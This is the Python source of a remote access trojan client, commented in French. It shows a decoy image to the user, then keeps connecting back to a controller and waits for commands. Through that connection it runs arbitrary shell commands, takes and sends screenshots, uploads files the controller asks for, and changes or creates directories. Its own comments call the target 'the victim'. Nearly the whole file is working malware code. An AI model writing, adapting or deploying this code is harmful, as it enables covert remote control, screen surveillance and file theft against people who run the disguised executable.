import socket, os, subprocess, mss, sys, time
from PIL import Image

# Fonction pour charger l'image(utilisé pour une bonne création de l'exe avec pyintaller)
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# Charger et afficher l'image
image_path = resource_path('Barbenoir.jpg')
image = Image.open(image_path)
image.show()

# Fonction de capture d'ecran
def screenshot():
    with mss.mss() as sct:
        sct.shot(output="screen.png")

# Creation d'un socket et tentative de connection (infinie)
def connect_to_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "127.0.0.1"
    port = 12345
    
    while True:
        try:
            s.connect((host, port))
            print(f"Connecte au serveur {host}:{port}")
            return s  # Retourne le socket une fois la connection etablie
        except ConnectionRefusedError:
            print("Echec de connection, reessaye dans 5 secondes...")
            time.sleep(5)  # Decompte de 5s

# Boucle principale pour la manipulation des commandes
def handle_commands(s):
    while True:
        try:
            # Reception de la commande
            command = s.recv(1024).decode("utf-8")
            
            # Cas de la commande d'arret
            if command == "close":
                s.send(b'close')
                s.close()
                break
            
            # Cas de la commande de capture d'ecran
            elif command == "screenshot":
                screenshot()
                len_img = str(os.path.getsize("screen.png"))
                s.send(len_img.encode("utf-8"))
                with open("screen.png", "rb") as img:
                    s.send(img.read())
                os.remove("screen.png")  # Supression de la capture chez la victime
            
            # Cas de la commande cd
            elif command == "cd":
                result = subprocess.Popen("cd", shell=True, stdout=subprocess.PIPE)
                s.send(result.stdout.read())
            
            # Changer de dossier
            elif command[:2] == "cd":
                new_dir = command[3:].strip()
                if os.path.exists(new_dir):
                    os.chdir(new_dir)
                    s.send(f"Vous etes passe dans le dossier {new_dir}".encode("utf-8"))
                else:
                    s.send(b"Le dossier n'as pas ete trouve.")
            
            # Cas de la commande mkdir et d'autres commandes qui n'envoient aucun retour
            elif command.startswith("mkdir"):
                try:
                    os.mkdir(command[6:].strip())  # Execute mkdir
                    s.send(b"Dossier cree avec succes!")
                except Exception as e:
                    s.send(f"Erreur: {str(e)}".encode("utf-8"))
            #Cas de la commade upload
            elif command == "upload":
                file = s.recv(1024).decode("utf-8")
                test = str(os.path.isfile(file))
                if test=="True":
                    s.send(b"Fichier trouve")
                    len_file = str(os.path.getsize(file))
                    s.send(len_file.encode("utf-8"))
                    with open (file,"rb") as file0:
                        s.send(file0.read())
                else:
                    s.send("Ooops!!Fichier non trouve:".encode('utf-8'))
            
            # All other commands
            else:
                r = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result = r.communicate()
                output = result[0].decode('cp850') if result[0] else result[1].decode('cp850')
                if output:
                    s.send(output.encode('utf-8'))
                else:
                    s.send(b"Commande executee avec succes sans retour.")
        
        except Exception as e:
            s.send(f"Erreur: {str(e)}".encode('utf-8'))
            break  # Break the loop if there is a serious error

if __name__ == "__main__":
    while True:
        # Tentavite de connection au server
        s = connect_to_server()
        # Maniplation des commandes un fois la connection etablie
        handle_commands(s)


"""#rm(remove) command
            elif command =="rm":
                file = s.recv(1024).decode("utf-8")
                test = str(os.path.isfile(file))
                if test=="True":
                    os.remove(file)
                    s.send(b'File deleted')
                else:
                    s.send(b'File not found')"""
